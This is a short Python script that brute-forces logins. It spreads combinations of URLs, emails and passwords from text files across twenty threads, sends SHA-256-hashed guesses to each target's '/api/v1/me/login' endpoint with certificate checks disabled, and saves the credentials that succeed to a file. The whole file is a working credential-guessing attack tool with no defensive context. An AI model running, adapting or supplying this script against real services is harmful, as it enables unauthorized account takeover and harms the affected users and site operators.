import threading
import queue
import requests
import hashlib

thread_num = 20
url_file = r'url.txt'
email_file = r'email.txt'
password_file = r'password.txt'
output_file = r'out.txt'

def verify(url, email, password):
    url_api = "{}/api/v1/me/login".format(url)
    password_sha = hashlib.sha256(password.encode('utf-8')).hexdigest()
    data = {
        "email": email,
        "password": password_sha,
        "remember_me": "false",
        "logout_previous": "true",
    }

    headers = {
        "Content-Type": "application/json"
    }
    requests.packages.urllib3.disable_warnings()
    try:
        response = requests.post(url_api, json=data, verify=False, headers=headers, timeout=1)
        if response.status_code == 204:
            return url, email, password
    except requests.exceptions.RequestException as e:
        pass
    return '', '', ''


class brutepwd(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)
        self.__queue = q

    def run(self):
        while not self.__queue.empty():
            uep = self.__queue.get()
            self.brute(uep)

    def brute(self, uep):
        u, e, p = verify(uep[0], uep[1], uep[2])
        if u == '':
            return
        print(u, e, p)
        out = "{} {} {}\n".format(u, e, p)
        with open(output_file, 'a') as f:
            f.write(out)

def main():
    threads = []
    q = queue.Queue()

    with open(url_file, 'r') as f0:
        url = f0.readlines()
        with open(email_file, 'r') as f1:
            email = f1.readlines()
            with open(password_file, 'r') as f2:
                password = f2.readlines()
                for u in url:
                    u = u.strip('\n')
                    for eml in email:
                        eml = eml.strip('\n')
                        for pwd in password:
                            pwd = pwd.strip('\n')
                            q.put([u, eml, pwd])

    for t in range(thread_num):
        t = brutepwd(q)
        threads.append(t)

    for i in threads:
        i.start()

    for i in threads:
        i.join()


if __name__ == "__main__":
    main()
